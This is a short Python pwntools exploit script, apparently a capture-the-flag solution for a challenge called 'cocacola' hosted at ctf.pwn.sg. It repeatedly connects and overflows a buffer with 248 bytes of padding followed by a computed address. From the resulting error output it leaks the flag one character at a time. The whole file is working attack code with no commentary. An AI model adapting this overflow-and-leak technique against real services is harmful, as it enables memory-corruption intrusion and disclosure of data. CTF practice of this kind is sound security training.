from pwn import *


flag = ""
i = 0
c= ""

with log.progress("Printing flag: ") as p:
	while c != "}":
		with context.quiet:
			#r = process('./cocacola')
			r = remote('ctf.pwn.sg', 4001)

			r.recvuntil('Do you want to flip the flag switch? (y/n) ')
			r.send('D\xc5')

			r.clean(4)

			string = "a" * 248 + p64(0x700b1000 + 30 + (i * 32))

			r.send(string)	

			r.sendline('\x00')	#set something to 0x0

			r.recvuntil("Error: ")
			c = r.recv(1)
			flag += c
			r.close()
		p.status(flag)
		i = i + 1
	p.success("Printed: " + flag)
